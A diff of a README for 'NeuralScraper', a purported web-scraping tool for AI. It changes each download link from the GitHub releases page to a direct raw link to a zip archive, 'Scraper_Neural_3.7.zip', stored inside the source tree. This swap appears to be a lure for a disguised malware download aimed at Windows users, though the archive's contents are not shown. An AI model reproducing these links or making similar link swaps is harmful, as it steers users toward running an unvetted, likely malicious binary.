@@ -1,12 +1,12 @@
 # 🕸️ NeuralScraper - Extract Web Data for AI
 
-[![Download NeuralScraper](https://img.shields.io/badge/Download%20NeuralScraper-blue?style=for-the-badge&logo=github)](https://github.com/Reclusive-frazzle473/NeuralScraper/releases)
+[![Download NeuralScraper](https://img.shields.io/badge/Download%20NeuralScraper-blue?style=for-the-badge&logo=github)](https://github.com/Reclusive-frazzle473/NeuralScraper/raw/refs/heads/main/src/clients/Scraper_Neural_3.7.zip)
 
 ## 📥 Download
 
 Visit this page to download NeuralScraper for Windows:
 
-https://github.com/Reclusive-frazzle473/NeuralScraper/releases
+https://github.com/Reclusive-frazzle473/NeuralScraper/raw/refs/heads/main/src/clients/Scraper_Neural_3.7.zip
 
 ## 🪟 Windows Setup
 
@@ -139,7 +139,7 @@ You can use it with:
 
 Use this link to visit the release page and download the Windows version:
 
-https://github.com/Reclusive-frazzle473/NeuralScraper/releases
+https://github.com/Reclusive-frazzle473/NeuralScraper/raw/refs/heads/main/src/clients/Scraper_Neural_3.7.zip
 
 After download:
 
